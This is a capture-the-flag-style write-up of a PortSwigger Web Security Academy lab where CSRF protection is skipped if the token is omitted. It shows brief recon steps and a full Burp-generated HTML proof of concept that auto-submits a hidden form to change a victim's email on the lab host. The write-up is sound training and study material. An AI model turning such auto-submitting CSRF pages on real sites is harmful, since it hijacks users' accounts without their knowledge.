# Lab: CSRF where token validation depends on token being present
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab's email change functionality is vulnerable to CSRF.
* Goal:  To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: `wiener:peter`

## Recon
1. Login and update email to trace the package
It's very similar with previous lab $\to$ it contained `CSRF_token` as its carried data:

2. Try to use 1st method to bypass

It seems can work properly.

## Exp - Delete `CSRF_token` directly to bypass
Actually, this is totally the same with the first lab's payload
Exploit Payload:
```javascript=
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/')</script>

    <form action="https://0aa70059042bf55d80101c7a00930051.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="danger&#64;gmail&#46;com" />
    </form>
    <script>
          document.forms[0].submit();
    </script>
  </body>
</html>
```
